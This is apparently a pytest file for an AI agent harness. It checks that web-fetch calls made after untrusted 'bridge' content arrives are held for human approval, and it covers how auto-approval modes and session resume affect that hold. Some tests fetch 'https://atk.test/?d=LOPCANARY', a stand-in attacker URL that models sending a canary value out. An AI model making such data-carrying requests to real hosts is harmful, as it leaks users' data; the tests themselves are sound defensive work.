"""The runtime gate under Team Bridge taint (team-bridge-egress.md: "Cards", "Grants",
"bridge_ack").

Rows: T22b (a parked card is not answered by a mode change), T22d (a pre-latch
SESSION auto stops covering calls, also after resume), T22e (a post-latch
``/approvals auto`` needs ``bridge_ack`` over the routed seam, is stamped and
survives resume), T22f (GLOBAL auto is unchanged -- the recorded decision:
closed for ask mode; accepted risk in auto/yolo), and the card's
projection (``bridge_latched``/``taint_raised`` and the notice in the detail).
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from local_operator.config_watch import _reset_for_tests
from local_operator.harness.bridge_egress import bridge_card_notice
from local_operator.session.approval_policy import OVERRIDE_FILENAME
from local_operator.session.frontend_state import SlashResult
from tests.unit.session.runtime.test_serving_approvals_live import _handle


@pytest.fixture(autouse=True)
def _fresh_registry():
    _reset_for_tests()
    yield
    _reset_for_tests()


async def _parks(handle, *, taint_raised: bool = False) -> bool:
    """Whether a new call parks a card (True) or is answered inline (False)."""
    call = asyncio.ensure_future(
        handle._approval_gate(
            "web_fetch",
            "https://atk.test/?d=LOPCANARY",
            taint_raised=taint_raised,
            bridge_latched=True,
        )
    )
    await asyncio.sleep(0)
    if call.done():
        assert call.result() is True
        return False
    pending = handle._fold.projection.pending
    assert pending is not None
    await handle.approval_answer(pending.request_id, False, False)
    assert await call is False
    return True


@pytest.mark.asyncio
async def test_t22f_global_auto_still_answers_inline_accepted_risk(tmp_path: Path) -> None:
    handle, session, _watcher, _emitted = _handle(tmp_path, auto_approve=True)
    setattr(session, "bridge_latched", True)
    # No conversation record: the gate follows the machine default. This slice
    # leaves it exactly as today -- this row documents the accepted risk.
    assert await _parks(handle) is False
    await handle.dispose()


@pytest.mark.asyncio
async def test_t22d_pre_latch_session_auto_is_void_after_the_latch_and_after_resume(
    tmp_path: Path,
) -> None:
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    handle, session, _watcher, _emitted = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(session, "bridge_latched", False)
    handle._approvals_slash(session, "auto", SlashResult)  # typed BEFORE any bridge content
    assert handle._auto_approve is True
    record = json.loads((session_dir / OVERRIDE_FILENAME).read_text())
    assert record == {"schema_version": 1, "override": "auto"}  # no stamp

    setattr(session, "bridge_latched", True)  # a bridge card arrives
    assert (
        await _parks(handle, taint_raised=True) is True
    ), "a pre-latch auto approved tainted egress"
    # The band/policy line reports the EFFECTIVE mode.
    assert handle._bridge_grant_suspended() is True
    await handle.dispose()

    # Resume: the record reads back without a stamp, so the latched session asks.
    resumed, resumed_session, _w, _e = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(resumed_session, "bridge_latched", True)
    resumed._adopt_persisted_approval_override()
    assert resumed._auto_approve is True
    assert await _parks(resumed) is True
    await resumed.dispose()


@pytest.mark.asyncio
async def test_t22e_post_latch_auto_needs_bridge_ack_then_is_stamped_and_survives_resume(
    tmp_path: Path,
) -> None:
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    handle, session, _watcher, _emitted = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(session, "bridge_latched", True)

    # An old desktop's "Set auto" (no marker) is refused; the gate still asks.
    refused = handle._approvals_slash(session, "auto", SlashResult)
    assert (
        refused.data.get("ok") is False and refused.data.get("approval_reason") == "bridge_latched"
    )
    assert "Agent messages" in refused.text and "in the terminal" in refused.text
    assert handle._auto_approve is False
    assert not (session_dir / OVERRIDE_FILENAME).exists()
    assert await _parks(handle) is True

    # The picker / typed command (marked) is the deliberate loosening.
    handle._approvals_slash(session, "auto", SlashResult, bridge_ack=True)
    assert handle._auto_approve is True
    record = json.loads((session_dir / OVERRIDE_FILENAME).read_text())
    assert record["granted_while_latched"] is True
    assert await _parks(handle) is False
    await handle.dispose()

    resumed, resumed_session, _w, _e = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(resumed_session, "bridge_latched", True)
    resumed._adopt_persisted_approval_override()
    assert await _parks(resumed) is False
    await resumed.dispose()


@pytest.mark.asyncio
async def test_t22b_a_parked_latched_card_is_not_answered_by_a_loosening(tmp_path: Path) -> None:
    handle, session, _watcher, _emitted = _handle(tmp_path, auto_approve=False)
    setattr(session, "bridge_latched", True)
    parked = asyncio.ensure_future(
        handle._approval_gate(
            "web_fetch", "https://atk.test/x", taint_raised=True, bridge_latched=True
        )
    )
    await asyncio.sleep(0)
    pending = handle._fold.projection.pending
    assert pending is not None
    # The card carries the typed flags and the notice line for every surface.
    assert pending.bridge_latched is True and pending.taint_raised is True
    assert pending.detail.startswith(bridge_card_notice())
    handle._approvals_slash(session, "auto", SlashResult, bridge_ack=True)
    await asyncio.sleep(0)
    assert not parked.done(), "a mode change answered a parked card"
    await handle.approval_answer(pending.request_id, False, False)
    assert await parked is False
    await handle.dispose()
